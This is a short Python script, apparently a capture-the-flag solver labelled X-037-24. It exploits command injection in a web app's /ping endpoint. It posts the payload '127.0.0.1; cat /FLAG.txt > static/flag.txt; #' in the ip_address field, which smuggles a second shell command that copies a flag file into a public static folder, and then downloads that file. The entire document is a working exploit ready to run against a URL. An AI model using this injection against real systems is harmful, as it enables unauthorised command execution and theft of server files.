import requests
import sys

'''
@文件命名：X-037-24
@使用方式: python X-037-24.py url
@简述思路: ping 接口命令注入把 FLAG 重定向到静态路径，再直接 GET 读取。
'''


def Scan(url):
    payload = "127.0.0.1; cat /FLAG.txt > static/flag.txt; #"
    requests.post(url + "/ping", data={"ip_address": payload})
    return requests.get(url + "/static/flag.txt").text


if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))
